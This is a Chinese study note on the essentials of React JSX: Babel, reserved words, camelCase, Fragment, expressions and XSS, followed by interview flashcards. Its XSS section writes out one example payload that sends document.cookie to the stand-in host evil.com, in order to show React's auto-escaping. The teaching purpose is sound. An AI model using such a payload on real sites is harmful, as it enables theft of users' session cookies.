---

title: "JSX本质"

created: "2025-07-12"

tags:

  - 八股文

  - react

  - react-ts-js

---

# JSX本质

## 四、JSX 相关术语
### Babel

> 一个 JS **编译器**。它把"浏览器不认识的新语法（JSX、ES6+、TypeScript）"翻译成"所有浏览器都认识的旧 JS"。

```text

你写的:  <h1>Hello</h1>        →  JSX，浏览器不认识

Babel:   _jsx('h1', null, 'Hello')  →  纯 JS 函数调用，浏览器认识

```

**和 Python 的类比**：TypeScript → Babel → JS，就像 Python 源码 → CPython 解释器 → 字节码。你写的不是最终执行的东西，中间有个翻译步骤。

---

### 保留字（Reserved Word）

> 编程语言留给自己的词，你不能用来做变量名/属性名。

```javascript

// JS 保留字举例：

class   // 用来声明类

for     // 用来写循环

if      // 用来写条件

new     // 用来创建对象

delete  // 用来删除属性

// 所以 JSX 里 class 要写成 className、for 要写成 htmlFor

// 因为你是在 JS 文件里写，得遵守 JS 的保留字规则

```

---

### 驼峰命名（Camel Case）

> 多个单词拼在一起，从第二个单词开始首字母大写：`backgroundColor`、`onClick`、`maxLength`。

HTML 属性一般是全小写或用连字符（`onclick`、`tabindex`、`maxlength`），但 JS 变量名不能用连字符（`max-length` 会解析成 `max - length`），所以 React 把所有属性名统一成驼峰。

---

### Fragment

> React 提供的"隐形包裹标签"。写法是 `<></>` 或 `<React.Fragment></React.Fragment>`。它不会在 DOM 里生成任何真实标签。

```javascript

// ❌ 如果没有 Fragment，你必须套一层多余的 <div>：

function TwoItems() {

    return (

        <div>              // ← 这个 div 是多余的，只是为了让 return 能返回一个根元素

            <span>A</span>

            <span>B</span>

        </div>

    );

}

// ✅ Fragment：不产生多余的 DOM 节点

function TwoItems() {

    return (

        <>                  // ← 隐形的根，渲染后 DOM 里找不到它

            <span>A</span>

            <span>B</span>

        </>

    );

}

```

---

### 表达式 vs 语句

| | 表达式（Expression） | 语句（Statement） |
| :--- | :--- | :--- |
| **有无返回值** | 有 | 没有 |
| **能放 `{}` 里吗** | ✅ 能 | ❌ 不能 |
| **举例** | `1+1`、`name`、`arr.map()`、三元 `x?y:z` | `if`、`for`、`while`、`let x=1` |
| **判断标准** | 能放进 `console.log()` 打印出来 | 不能放进 `console.log()` |

> JSX 的 `{}` = 填空题，只能填"答案"（表达式），不能填"步骤"（语句）。

---

### XSS（跨站脚本攻击，Cross-Site Scripting）

> 攻击者在网页里注入恶意 `<script>` 标签，在别的用户浏览器上执行 JS 代码，窃取 cookie、弹窗钓鱼等。

```javascript

// 假设用户在评论区输入了这段恶意代码：

const userComment = '<script>fetch("http://evil.com?cookie=" + document.cookie)</script>';

// React JSX {} 自动转义——尖括号变成纯文本：

<div>{userComment}</div>

// 页面显示: <script>fetch(...)</script>   ← 纯文字，不会执行

// 因为 React 把 < 转成了 &lt;，> 转成了 &gt;

```

> React 默认安全就是因为这个自动转义。`dangerouslySetInnerHTML` 名字起这么长，就是反复警告你"你知道你在干什么吧？"

---

## 速记卡（面试闪卡）

**Q1：一句话讲清「JSX本质」到底是什么？**

A：JSX 本质是语法糖：写起来像 HTML，被 Babel 编译成 React.createElement 函数调用。

**Q2：一、JSX 是什么、Babel 怎么编 —— 怎么理解？**

A：JSX 写起来像 HTML，但浏览器不认识，Babel 把它编译成 React.createElement('h1',null,'Hello') 这样的纯 JS 函数调用。比喻：你写的 JSX 像手写的便条，Babel 是翻译官，把它翻成浏览器看得懂的机器语言。英文：JSX、Babel、createElement。

**Q3：二、JSX 里的保留字与驼峰 —— 怎么理解？**

A：class/for 是 JS 保留字，所以 JSX 里要写成 className/htmlFor。HTML 属性全小写，JS 变量名不能用连字符，所以 React 统一用驼峰（onClick、backgroundColor）。比喻：JSX 是写在 JS 文件里的，得守 JS 的规矩——就像在法语作文里不能用英语语法。英文：reserved word（保留字）、camelCase（驼峰）、className。

**Q4：三、Fragment 与 {} 只能填表达式 —— 怎么理解？**

A：多个元素必须有根，套 <div> 会多一个 DOM 节点；Fragment（<></>）是隐形根，渲染后不在 DOM 留节点。JSX 的 {} 像填空题，只能填"答案"（表达式，有返回值），不能填"步骤"（if/for 语句）。比喻：Fragment 是透明文件夹，{} 是只能写结果的答题框。英文：Fragment（片段）、expression vs statement（表达式 vs 语句）。

**Q5：四、为什么 React 默认防 XSS —— 怎么理解？**

A：用户在评论区输入 <script> 恶意代码，React 把 < 转成 &lt;、> 转成 &gt;，尖括号变纯文本不执行。这就是自动转义，是 React 默认安全的原因。dangerouslySetInnerHTML 名字起得这么长就是警告你"你知道在干啥吧"。比喻：React 像尽职的安检，把危险品先消了毒再上架。英文：XSS（跨站脚本）、auto-escaping（自动转义）。

**Q6：核心速记主线有哪些？**

- JSX 是语法糖，Babel 编成 createElement 调用

- class→className、for→htmlFor，属性用驼峰

- Fragment 隐形根，不产生多余 DOM

- {} 只填表达式（有返回值），不能填语句

- React 自动转义防 XSS

**口诀**

A：JSX 是糖衣包，Babel 翻成 createElement 调；

class 改名 className，驼峰属性规矩牢。

Fragment 透明根，不留 DOM 节点悄；

{} 只填表达式，自动转义防 XSS 刀。

## 相关链接

- 📋 目录：[[00-React]]

- 📚 学习清单：[[八股文学习路线图]]

